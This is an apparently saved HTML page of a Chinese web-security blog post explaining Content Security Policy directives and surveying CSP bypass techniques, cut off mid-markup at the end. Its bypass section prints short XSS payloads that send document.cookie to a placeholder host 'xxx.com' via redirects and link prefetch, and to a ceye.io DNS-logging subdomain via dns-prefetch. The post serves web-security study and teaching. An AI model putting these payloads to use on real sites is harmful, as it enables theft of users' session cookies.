@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>浅谈CSP内容安全策略 | NonupleBroken</title><meta name="description" content="CSP 内容安全策略（Content Security Policy，CSP），是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-P"><meta name="keywords" content="WEB,XSS,CSP"><meta name="author" content="NonupleBroken"><meta name="copyright" content="NonupleBroken"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://i.loli.net/2020/06/15/yNt2zEPRqjwh7IO.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="浅谈CSP内容安全策略"><meta name="twitter:description" content="CSP 内容安全策略（Content Security Policy，CSP），是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-P"><meta name="twitter:image" content="https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images&amp;r=浅谈CSP内容安全策略"><meta property="og:type" content="article"><meta property="og:title" content="浅谈CSP内容安全策略"><meta property="og:url" content="https://nonuplebroken.com/2019/07/20/%E6%B5%85%E8%B0%88CSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"><meta property="og:site_name" content="NonupleBroken"><meta property="og:description" content="CSP 内容安全策略（Content Security Policy，CSP），是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-P"><meta property="og:image" content="https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images&amp;r=浅谈CSP内容安全策略"><meta property="article:published_time" content="2019-07-20T14:36:29.000Z"><meta property="article:modified_time" content="2020-06-16T07:15:46.296Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = 'false'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://nonuplebroken.com/2019/07/20/%E6%B5%85%E8%B0%88CSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"><link rel="prev" title="CSRF小结" href="https://nonuplebroken.com/2019/07/21/CSRF%E5%B0%8F%E7%BB%93/"><link rel="next" title="浅谈SOP同源策略" href="https://nonuplebroken.com/2019/07/13/%E6%B5%85%E8%B0%88SOP%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime_unit: 'days',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: {"bookmark":{"message_prev":"Press","message_next":"to bookmark this page"},"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#2d3035","position":"top-center"},
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://i.loli.net/2020/06/15/imOPRpIQl1aNYSH.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">28</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">37</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> About</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#csp"><span class="toc-number">1.</span> <span class="toc-text"> CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">2.</span> <span class="toc-text"> Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跳转"><span class="toc-number">2.1.</span> <span class="toc-text"> 跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#link标签预加载"><span class="toc-number">2.2.</span> <span class="toc-text"> link标签预加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨域请求"><span class="toc-number">2.3.</span> <span class="toc-text"> 跨域请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#locationhash"><span class="toc-number">2.4.</span> <span class="toc-text"> location.hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-number">2.5.</span> <span class="toc-text"> 文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text"> 参考</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">NonupleBroken</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">浅谈CSP内容安全策略</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2019-07-20 22:36:29"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2019-07-20</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-06-16 15:15:46"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-06-16</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="csp"><a class="markdownIt-Anchor" href="#csp"></a> CSP</h2>
+<p>内容安全策略（Content Security Policy，CSP），是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。</p>
+<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成。</p>
+<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; www.test.com;</span><br></pre></td></tr></table></figure>
+<p>另一种是通过 <code>&lt;meta&gt;</code> 标签。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;; script-src &#39;self&#39;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>CSP 提供了很多限制选项：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">限制选项</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">default-src</td>
+<td style="text-align:left">资源默认加载策略</td>
+</tr>
+<tr>
+<td style="text-align:center">script-src</td>
+<td style="text-align:left">外部脚本</td>
+</tr>
+<tr>
+<td style="text-align:center">connect-src</td>
+<td style="text-align:left">HTTP连接，如 XHR、WebSockets、EventSource等</td>
+</tr>
+<tr>
+<td style="text-align:center">style-src</td>
+<td style="text-align:left">样式表 CSS</td>
+</tr>
+<tr>
+<td style="text-align:center">img-src</td>
+<td style="text-align:left">图片</td>
+</tr>
+<tr>
+<td style="text-align:center">media-src</td>
+<td style="text-align:left">媒体，如 audio、video</td>
+</tr>
+<tr>
+<td style="text-align:center">font-src</td>
+<td style="text-align:left">字体</td>
+</tr>
+<tr>
+<td style="text-align:center">frame-src</td>
+<td style="text-align:left">嵌入的外部资源，如 frame、iframe、embed、applet</td>
+</tr>
+</tbody>
+</table>
+<p>每个限制选项可以设置以下几种值，这些值就构成了白名单：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">值</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">主机名</td>
+<td style="text-align:left"><a href="https://example.com:80" target="_blank" rel="noopener">https://example.com:80</a>  http://*.test.com</td>
+</tr>
+<tr>
+<td style="text-align:center">协议名</td>
+<td style="text-align:left">https: data:</td>
+</tr>
+<tr>
+<td style="text-align:center">‘self’</td>
+<td style="text-align:left">允许加载同域资源，需要加引号</td>
+</tr>
+<tr>
+<td style="text-align:center">‘none’</td>
+<td style="text-align:left">禁止加载任何外部资源，需要加引号</td>
+</tr>
+<tr>
+<td style="text-align:center">*</td>
+<td style="text-align:left">通配符，允许除 data: blob: filesystem: 协议之外的任意 URL</td>
+</tr>
+</tbody>
+</table>
+<p>除了常规值，script-src 还可以设置一些特殊值：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">值</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">‘unsafe-inline’</td>
+<td style="text-align:left">允许执行页面内嵌的 script 标签和事件监听函数</td>
+</tr>
+<tr>
+<td style="text-align:center">‘unsafe-eval’</td>
+<td style="text-align:left">允许将字符串当作代码执行，如eval、setTimeout、setInterval和Function等函数</td>
+</tr>
+<tr>
+<td style="text-align:center">nonce</td>
+<td style="text-align:left">每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</td>
+</tr>
+<tr>
+<td style="text-align:center">hash</td>
+<td style="text-align:left">列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行</td>
+</tr>
+<tr>
+<td style="text-align:center">dynamic</td>
+<td style="text-align:left">可信js生成的js代码是可信的</td>
+</tr>
+</tbody>
+</table>
+<p>含有 nonce 值的 CSP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;nonce-d87adgi2&#39;</span><br></pre></td></tr></table></figure>
+<p>页面内嵌脚本，必须有这个 token 才能执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">d87adgi2</span>&gt;</span> alert(1) <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>含有 hash 值的 CSP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;&#39;</span><br></pre></td></tr></table></figure>
+<p>下面的代码才会允许执行，因为 sha256 值相符（不包括标签）。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Hello, world.'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>值得注意的是，同源策略是可以发送请求只是浏览器拦截了，而CSP禁止加载的资源，是连请求都被拦截的，根本发不出去。</strong></p>
+<h2 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> Bypass</h2>
+<h3 id="跳转"><a class="markdownIt-Anchor" href="#跳转"></a> 跳转</h3>
+<p>无论有怎样的限制，跳转总是可以实现的。当然 window 和 location 是 js 脚本需要 <code>script-src unsafe-inline</code>。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;http://xxx.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://xxx.com?a="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">"http://xxx.com?a="</span> + <span class="built_in">document</span>.cooke)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="link标签预加载"><a class="markdownIt-Anchor" href="#link标签预加载"></a> link标签预加载</h3>
+<p>当CSP为 <code>default-src 'self'; script-src 'self';</code> 时，由于 CSP 对 link 标签的预加载功能考虑不完善。在旧版本 Chrome下，可以使用 prefetch 发送数据。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://xxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样没法将 cookie 带出，因此如果 <code>script-src unsafe-inline</code> 的条件下，可以动态生成标签带出 cookie。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">"link"</span>);</span></span><br><span class="line"><span class="actionscript">li.rel = <span class="string">"prefetch"</span>;</span></span><br><span class="line"><span class="javascript">li.setAttribute(<span class="string">"href"</span>, <span class="string">"//xxx.com/?"</span> + <span class="built_in">document</span>.cookie);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.head.appendChild(li);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然新版本的 Chrome 会拒绝预加载。</p>
+<p>值得一提的是，dns-prefetch 是最新版的 FireFox 和 Chrome 还可以使用的发送数据方法，这个方法是不受 <code>default-src: self</code> CSP 影响的。</p>
+<p>dns-prefetch（DNS 预解析）允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"http://xxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同样在 <code>script-src unsafe-inline</code> 的条件下，可以动态生成标签带出 cookie。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">cok = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span></span><br><span class="line"><span class="javascript">head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"HEAD"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> str = <span class="string">""</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cok.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">    str += <span class="built_in">escape</span>(cok[i].replace(<span class="regexp">/\//g</span>, <span class="string">"-"</span>)).replace(<span class="regexp">/%/g</span>, <span class="string">"_"</span>) + <span class="string">"."</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="handlebars"><span class="xml">head.innerHTML = "<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'dns-prefetch'</span> <span class="attr">href</span>=<span class="string">'//" + str + "r.7b0qyg.ceye.io'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因为域名的命名规则是 <code>[.-a-zA-Z0-9]+</code>，所以需要对一些特殊字符进行替换。这样就可以在 DNS 平台上收到 DNS 解析的记录了：</p>
+<p><img src="https://i.loli.net/2020/06/11/967tKAwkueHidbC.png" alt="6" /></p>
+<p>除此之外，rel 还有 preconnect、preload 等。preload 需要 CSP 中有 <code>default-src: connect-src *</code> 才行。</p>
+<h3 id="跨域请求"><a class="markdownIt-Anchor" href="#跨域请求"></a> 跨域请求</h3>
+<p>提交表单、点击链接等跨域行为是不受 CSP 限制的。还有一些跨域请求比如 window.postMessage 也是可以利用的。</p>
+<p>0CTF 2018 预选赛中的 h4xors.club2：</p>
+<ul>
+<li><a href="https://lorexxar.cn/2018/04/10/0ctf2018-club2/" target="_blank" rel="noopener">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</a></li>
+</ul>
+<h3 id="locationhash"><a class="markdownIt-Anchor" href="#locationhash"></a> location.hash</h3>
+<p>如果js存在操作 location.hash 导致的 xss，那么这样的攻击请求不会经过后台，那么 nonce 后的随机值就不会刷新。见 lorexxar 师傅的文章：</p>
+<ul>
+<li><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a></li>
+</ul>
+<h3 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h3>
+<p>如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p>
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<ul>
+<li><a href="http://heartsky.info/2017/03/03/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87%E7%9A%84CSP/" target="_blank" rel="noopener">http://heartsky.info/2017/03/03/那些年我们绕过的CSP/</a></li>
+<li><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a></li>
+<li><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">https://paper.seebug.org/423/</a></li>
+</ul>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">NonupleBroken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://nonuplebroken.com/2019/07/20/%E6%B5%85%E8%B0%88CSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/">https://nonuplebroken.com/2019/07/20/%E6%B5%85%E8%B0%88CSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/CSP/">CSP</a></div><div class="post_share"><div class="social-share" data-image="https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images&amp;r=2021津门杯justOCB" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="https://i.loli.net/2020/06/15/IhSBM3Q576veJYy.png" alt="WeChat Pay"/><div class="post-qr-code__desc">WeChat Pay</div></li><li class="reward-item"><img class="post-qr-code__img" src="https://i.loli.net/2020/06/15/SI8vipmr2UCxbtR.png" alt="Alipay"/><div class="post-qr-code__desc">Alipay</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/07/21/CSRF%E5%B0%8F%E7%BB%93/"><img class="prev_cover" src="https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images&amp;r=CSRF小结" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CSRF小结</div></div></a></div><div class="next-post pull_right"><a href="/2019/07/13/%E6%B5%85%E8%B0%88SOP%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"><img class="next_cover" src="https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images&amp;r=浅谈SOP同源策略" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">浅谈SOP同源策略</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> Comment</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var requestSetting = function (from,set) {
+  var from = from
+  var setting = set.split(',').filter(function(item){
+  return from.indexOf(item) > -1
+  });
+  setting = setting.length == 0 ? from :setting;
+  return setting
+}
+
+var guestInfo = requestSetting(['nick','mail','link'],'nick,mail,link')
+var requiredFields = requestSetting(['nick','mail','link'],'nick')
+
+window.valine = new Valine({
+  el:'#vcomment',
+  appId: 'W5gBlULjrFdLa2PMBAsaecvL-gzGzoHsz',
+  appKey: 'e7tEGcjJPX1J35kwFEqnWK0X',
+  notify: false,
+  verify: false,
+  placeholder: 'Please leave your footprints',
+  avatar: 'identicon',
+  meta: guestInfo,
+  pageSize: '10',
+  lang: 'en',
+  recordIP: false,
+  serverURLs: '',
+  emojiCDN: '',
+  emojiMaps: "",
+  enableQQ: false,
+  requiredFields: requiredFields
+});</script></div></article></main><footer id="footer" style="background-image: url(https://api.btstu.cn/sjbz/api.php?lx=fengjing&amp;format=images)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2021 By NonupleBroken</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">Welcome and have fun!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="Scroll to comment"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input 